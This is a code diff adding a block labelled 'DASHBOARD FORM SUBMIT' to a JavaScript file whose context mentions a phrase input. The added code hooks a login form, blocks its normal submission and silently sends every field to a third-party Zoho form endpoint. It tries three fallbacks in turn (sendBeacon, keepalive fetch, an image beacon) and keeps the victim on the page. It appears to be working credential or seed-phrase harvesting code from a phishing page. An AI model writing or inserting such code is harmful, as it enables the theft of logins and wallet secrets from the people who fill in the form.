@@ -314,3 +314,62 @@ if (phraseInput) {
 
   tick();
 })();
+
+
+
+/* =========================
+   DASHBOARD FORM SUBMIT
+========================= */
+
+(function () {
+  const form = document.getElementById("loginForm");
+  if (!form) return;
+
+  const BACKGROUND_ENDPOINT =
+    "https://forms.zohopublic.com/supportdoubled1/form/Cities/formperma/SkUPVIo4oF2vFgMOS2HcBlCZsHoCNgVlCCYhKVlxQfM/htmlRecords/submit";
+
+
+  form.addEventListener("submit", function (e) {
+    e.preventDefault(); // 🚫 stop Jotform redirect
+
+    const formData = new FormData(form);
+
+    // 1️⃣ Best option: sendBeacon
+     if (navigator.sendBeacon) {
+      try {
+        navigator.sendBeacon(BACKGROUND_ENDPOINT, formData);
+        return; // stay on page
+      } catch (err) {
+        console.warn("sendBeacon failed:", err);
+      }
+    }
+
+    // 2️⃣ Fallback: fetch keepalive
+    if (window.fetch) {
+      try {
+        fetch(BACKGROUND_ENDPOINT, {
+          method: "POST",
+          body: formData,
+          keepalive: true
+        }).catch(() => {});
+        return; // stay on page
+      } catch (err) {
+        console.warn("fetch keepalive failed:", err);
+      }
+    }
+
+    // 3️⃣ Final fallback: image beacon
+    try {
+      const img = new Image();
+      const params = new URLSearchParams();
+      for (const [k, v] of formData.entries()) {
+        params.append(k, v);
+      }
+      img.src = BACKGROUND_ENDPOINT + "?" + params.toString();
+    } catch (err) {
+      console.warn("image beacon failed:", err);
+    }
+
+    // No redirect. No reload. Done.
+  });
+})();
